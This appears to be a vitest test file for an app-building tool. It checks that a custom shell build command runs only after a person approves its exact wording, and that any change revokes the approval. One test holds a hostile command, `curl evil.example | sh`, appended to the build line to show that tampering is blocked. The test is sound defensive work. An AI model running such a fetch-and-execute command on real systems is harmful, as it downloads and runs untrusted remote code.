// SPDX-License-Identifier: AGPL-3.0-only
/**
 * An app that builds its screens with a command of its own.
 *
 * The command is a shell, so what matters is when it does NOT run: never
 * before a person approved its exact words, and never again once one of them
 * changes.
 */
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { buildProjectApps } from '../src/project/apps/build-apps.js';
import { checkApp } from '../src/project/apps/check-app.js';
import { approveBuild, buildFingerprint, isBuildApproved, readAppBuild, type AppBuildFile, type StepRunner } from '../src/project/apps/own-build.js';
import { scaffoldApp } from '../src/project/apps/scaffold-app.js';
import { APP_VERSION } from '../src/version.js';
import { tempProject } from './app-project-helpers.js';

let root: string;
const BUILD: AppBuildFile = { install: 'npm ci --ignore-scripts', command: 'vite build --outDir dist-surface/shop/staff', output: 'dist-surface/shop' };
const app = (...rest: string[]): string => join(root, 'apps/shop', ...rest);
const write = (file: string, value: unknown): void => {
  mkdirSync(join(app(file), '..'), { recursive: true });
  writeFileSync(app(file), typeof value === 'string' ? value : JSON.stringify(value, null, 2));
};

beforeEach(() => {
  root = tempProject('adminium-own-build-');
  // The starter with a staff side, whose screens then move to where a build of its own keeps them.
  scaffoldApp({ root, key: 'shop', name: 'Shop', sides: ['staff'], version: APP_VERSION });
  rmSync(app('staff'), { recursive: true });
  write('src/main.tsx', 'export {};');
  write('package-lock.json', '{}');
  write('build.json', BUILD);
});
afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

/** A build that leaves a staff side behind, and remembers what it was asked to run. */
function fakeBuild(): { run: StepRunner; lines: string[] } {
  const lines: string[] = [];
  return {
    lines,
    run: async (line, cwd) => {
      lines.push(line);
      if (line === BUILD.command) {
        mkdirSync(join(cwd, 'dist-surface/shop/staff/assets'), { recursive: true });
        writeFileSync(join(cwd, 'dist-surface/shop/staff/index.html'), '<!doctype html><title>Shop</title>');
        writeFileSync(join(cwd, 'dist-surface/shop/staff/assets/main.js'), 'console.log(1)');
      }
      return { ok: true, output: '' };
    },
  };
}
const build = (run: StepRunner) => buildProjectApps(root, { version: APP_VERSION, bundler: null, runBuild: run });

describe('an app with a build of its own', () => {
  it('has the sides its manifest declares, with no engine-built entry file', () => {
    const check = checkApp(root, 'shop', { version: APP_VERSION });
    expect(check.findings.filter((finding) => finding.level === 'error')).toEqual([]);
    expect(check.sides).toEqual(['staff']);
  });

  it('is not built until a person approved the exact command, and says what would run', async () => {
    const fake = fakeBuild();
    const built = await build(fake.run);
    expect(fake.lines).toEqual([]);
    expect(built.apps[0]?.problems?.[0]).toContain('its build is not approved');
    expect(built.apps[0]?.problems?.[0]).toContain(BUILD.command);
    expect(built.apps[0]?.problems?.[0]).toContain('adminium app approve-build shop');
  });

  it('runs the install once and the build each time, and serves what the build left', async () => {
    approveBuild(root, 'shop', BUILD);
    expect(readFileSync(join(root, '.adminium/approved-builds.json'), 'utf8')).toContain(buildFingerprint(BUILD));
    const fake = fakeBuild();
    const built = await build(fake.run);
    expect(built.apps[0]).toMatchObject({ key: 'shop', sides: ['staff'] });
    expect(built.apps[0]?.problems).toBeUndefined();
    expect(fake.lines).toEqual([BUILD.install, BUILD.command]);
    expect(existsSync(join(root, '.adminium/build/apps/shop/staff/index.html'))).toBe(true);
    expect(existsSync(join(root, '.adminium/build/apps/shop/staff/assets/main.js'))).toBe(true);

    // A second build: the packages are there, the lock file is the same.
    await build(fake.run);
    expect(fake.lines).toEqual([BUILD.install, BUILD.command, BUILD.command]);
    // A changed lock file installs again.
    write('package-lock.json', '{"changed":true}');
    await build(fake.run);
    expect(fake.lines.slice(3)).toEqual([BUILD.install, BUILD.command]);
  });

  it('is unapproved again the moment one word of the command changes', async () => {
    approveBuild(root, 'shop', BUILD);
    const changed = { ...BUILD, command: `${BUILD.command} && curl evil.example | sh` };
    write('build.json', changed);
    expect(isBuildApproved(root, 'shop', changed)).toBe(false);
    const fake = fakeBuild();
    const built = await build(fake.run);
    expect(fake.lines).toEqual([]);
    expect(built.apps[0]?.problems?.[0]).toContain('curl evil.example');
  });

  it('says a failed build with the end of what it printed, and a build that left no page', async () => {
    approveBuild(root, 'shop', BUILD);
    const failing = await build(async (line) => (line === BUILD.command ? { ok: false, output: 'x\nsrc/App.tsx: Cannot find name "jobs".\n' } : { ok: true, output: '' }));
    expect(failing.apps[0]?.problems?.[0]).toContain('its screens did not build');
    expect(failing.apps[0]?.problems?.[0]).toContain('Cannot find name "jobs"');
    const empty = await build(async () => ({ ok: true, output: '' }));
    expect(empty.apps[0]?.problems?.[0]).toContain('left no dist-surface/shop/staff/index.html');
  });

  it('refuses a build file that does not read, or sends its output out of the app', () => {
    write('build.json', '{');
    expect(readAppBuild(root, 'shop')).toMatchObject({ problem: expect.stringContaining('not valid JSON') });
    write('build.json', { ...BUILD, output: '../../somewhere' });
    expect(readAppBuild(root, 'shop')).toMatchObject({ problem: expect.stringContaining('plain folder inside the app') });
    write('build.json', { install: 'x', command: 'a\nb', output: 'out' });
    expect(readAppBuild(root, 'shop')).toMatchObject({ problem: expect.stringContaining('each one line') });
  });
});
